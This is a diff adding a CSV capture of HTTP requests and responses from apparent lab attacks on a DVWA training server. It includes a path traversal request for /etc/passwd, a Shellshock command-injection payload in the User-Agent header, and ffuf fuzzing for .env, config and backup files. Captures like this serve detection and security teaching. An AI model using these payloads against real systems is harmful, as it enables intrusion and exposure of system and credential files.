@@ -1,0 +1,19 @@
+frame.time,ip.src,tcp.srcport,ip.dst,tcp.dstport,http.request.method,http.request.uri,http.request.version,http.user_agent,http.host,http.response.version,http.response.code,http.response.phrase,http.content_length
+Aug 28\, 2025 15:21:18.920413961 WIB,192.168.19.129,60850,192.168.19.128,80,GET,/dvwa/vulnerabilities/fi/?page=../../etc/passwd,HTTP/1.1,curl/8.14.1,192.168.19.128,,,,
+Aug 28\, 2025 15:21:18.967764733 WIB,192.168.19.128,80,192.168.19.129,60850,,/dvwa/vulnerabilities/fi/?page=../../etc/passwd,,,,HTTP/1.1,302,Found,0
+Aug 28\, 2025 15:21:19.522071276 WIB,192.168.19.129,60866,192.168.19.128,80,POST,/dvwa/vulnerabilities/exec/,HTTP/1.1,curl/8.14.1,192.168.19.128,,,,20
+Aug 28\, 2025 15:21:19.555118959 WIB,192.168.19.128,80,192.168.19.129,60866,,/dvwa/vulnerabilities/exec/,,,,HTTP/1.1,302,Found,0
+Aug 28\, 2025 15:21:25.155438927 WIB,192.168.19.129,41396,192.168.19.128,80,OPTIONS,/dvwa/login.php,HTTP/1.1,curl/8.14.1,192.168.19.128,,,,
+Aug 28\, 2025 15:21:25.176466368 WIB,192.168.19.128,80,192.168.19.129,41396,,/dvwa/login.php,,,,HTTP/1.1,200,OK,1289
+Aug 28\, 2025 15:21:25.724672290 WIB,192.168.19.129,41406,192.168.19.128,80,GET,/dvwa/index.php,HTTP/1.1,() { :;}; /bin/bash -c 'id',192.168.19.128,,,,
+Aug 28\, 2025 15:21:25.744079088 WIB,192.168.19.128,80,192.168.19.129,41406,,/dvwa/index.php,,,,HTTP/1.1,302,Found,0
+Aug 28\, 2025 15:21:32.203630366 WIB,192.168.19.129,59436,192.168.19.128,80,GET,/dvwa/admin,HTTP/1.1,Fuzz Faster U Fool v2.1.0-dev,192.168.19.128,,,,
+Aug 28\, 2025 15:21:32.204077899 WIB,192.168.19.129,59432,192.168.19.128,80,GET,/dvwa/.env,HTTP/1.1,Fuzz Faster U Fool v2.1.0-dev,192.168.19.128,,,,
+Aug 28\, 2025 15:21:32.204088170 WIB,192.168.19.129,59434,192.168.19.128,80,GET,/dvwa/dashboard,HTTP/1.1,Fuzz Faster U Fool v2.1.0-dev,192.168.19.128,,,,
+Aug 28\, 2025 15:21:32.204090299 WIB,192.168.19.129,59438,192.168.19.128,80,GET,/dvwa/config,HTTP/1.1,Fuzz Faster U Fool v2.1.0-dev,192.168.19.128,,,,
+Aug 28\, 2025 15:21:32.204257968 WIB,192.168.19.129,59458,192.168.19.128,80,GET,/dvwa/backup.zip,HTTP/1.1,Fuzz Faster U Fool v2.1.0-dev,192.168.19.128,,,,
+Aug 28\, 2025 15:21:32.205079750 WIB,192.168.19.128,80,192.168.19.129,59436,,/dvwa/admin,,,,HTTP/1.1,404,Not Found,293
+Aug 28\, 2025 15:21:32.205247088 WIB,192.168.19.128,80,192.168.19.129,59432,,/dvwa/.env,,,,HTTP/1.1,404,Not Found,292
+Aug 28\, 2025 15:21:32.205658656 WIB,192.168.19.128,80,192.168.19.129,59434,,/dvwa/dashboard,,,,HTTP/1.1,404,Not Found,297
+Aug 28\, 2025 15:21:32.205892581 WIB,192.168.19.128,80,192.168.19.129,59438,,/dvwa/config,,,,HTTP/1.1,301,Moved Permanently,327
+Aug 28\, 2025 15:21:32.206201595 WIB,192.168.19.128,80,192.168.19.129,59458,,/dvwa/backup.zip,,,,HTTP/1.1,404,Not Found,298
